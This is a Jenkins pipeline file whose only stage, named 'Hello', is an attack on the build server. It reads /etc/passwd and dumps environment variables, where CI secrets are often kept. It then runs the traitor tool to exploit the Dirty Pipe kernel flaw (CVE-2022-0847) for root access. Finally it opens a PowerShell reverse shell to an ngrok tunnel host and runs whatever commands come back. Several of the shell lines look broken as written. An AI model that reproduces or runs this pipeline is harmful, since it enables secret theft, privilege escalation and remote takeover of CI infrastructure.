pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'cat /etc/passwd'
                sh 'env'
                sh 'chmod 777 traitor-amd64'
                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
                sh 'id'
                sh 'whoami'
                sh 'ls -a'
                sh 'ls -la /'
                sh 'ls -la /var/'
                sh '-nop -c "$client = New-Object System.Net.Sockets.TCPClient('7.tcp.eu.ngrok.io',15848);'
                sh '$stream = $client.GetStream();'
                sh '[byte[]]$bytes = 0..65535|%{0};'
                sh 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
                sh '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                sh '$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';'
                sh '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
                sh '$stream.Write($sendbyte,0,$sendbyte.Length);'
                sh '$stream.Flush()};'
                sh '$client.Close()"'
            }
        }
    }
}
